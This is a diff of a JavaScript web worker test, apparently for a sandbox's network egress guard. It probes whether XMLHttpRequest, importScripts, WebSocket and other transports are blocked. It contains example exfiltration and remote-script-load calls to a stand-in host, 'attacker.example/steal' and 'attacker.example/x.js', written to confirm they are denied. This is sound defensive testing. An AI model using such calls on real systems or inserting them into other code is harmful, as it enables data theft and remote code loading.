@@ -69,31 +69,18 @@ self.onmessage = async (event) => {
         } catch (e) { out.__toctouGetter = e && e.name === 'EgressDenied' ? 'DENIED:' + e.reason : 'other:' + (e && e.message || e); }
       } else { out.__toctouGetter = 'NOT_PROBED'; }
 
-      // XMLHttpRequest is a second, independent network path. Pyodide's
-      // synchronous HTTP shims use it, so an unguarded XHR is not a corner case.
-      if (typeof self.XMLHttpRequest === 'function') {
-        try {
-          const x = new self.XMLHttpRequest();
-          x.open('GET', 'https://attacker.example/steal', true);
-          out.__xhrDenied = 'REACHED';
-        } catch (e) { out.__xhrDenied = e && e.name === 'EgressDenied' ? 'DENIED:' + e.reason : 'other'; }
-        try {
-          const x2 = new self.XMLHttpRequest();
-          x2.open('GET', ${JSON.stringify(probes.allowedDataPlane)}, true);
-          out.__xhrAllowed = 'PASSED_GUARD';
-        } catch (e) { out.__xhrAllowed = e && e.name === 'EgressDenied' ? 'DENIED:' + e.reason : 'other'; }
-      } else {
-        out.__xhrDenied = 'NO_XHR_IN_ENV';
-        out.__xhrAllowed = 'NO_XHR_IN_ENV';
-      }
-
       // importScripts performs a real cross-origin GET outside fetch and XHR.
       if (typeof self.importScripts === 'function') {
         try { self.importScripts('https://attacker.example/x.js'); out.__importScripts = 'REACHED'; }
         catch (e) { out.__importScripts = e && e.name === 'EgressDenied' ? 'DENIED:' + e.reason : 'other'; }
       } else { out.__importScripts = 'NO_IMPORTSCRIPTS_IN_ENV'; }
 
-      for (const t of ['WebSocket', 'EventSource', 'Worker', 'SharedWorker']) {
+      // XMLHttpRequest is removed the same way as the four transports below:
+      // it is in this loop, not a separate probe, because it is no longer a
+      // patched-and-checked constructor, it is a thrower like the rest.
+      // Constructed against an ALLOWED origin (not an attacker one), because
+      // the point is that it never gets far enough to look at the URL at all.
+      for (const t of ['WebSocket', 'EventSource', 'Worker', 'SharedWorker', 'XMLHttpRequest']) {
         try { new self[t]('https://zarr.nemar.org/x'); out['__' + t] = 'CONSTRUCTED'; }
         catch (e) { out['__' + t] = e && e.name === 'EgressDenied' ? 'DENIED:' + e.reason : 'other'; }
       }
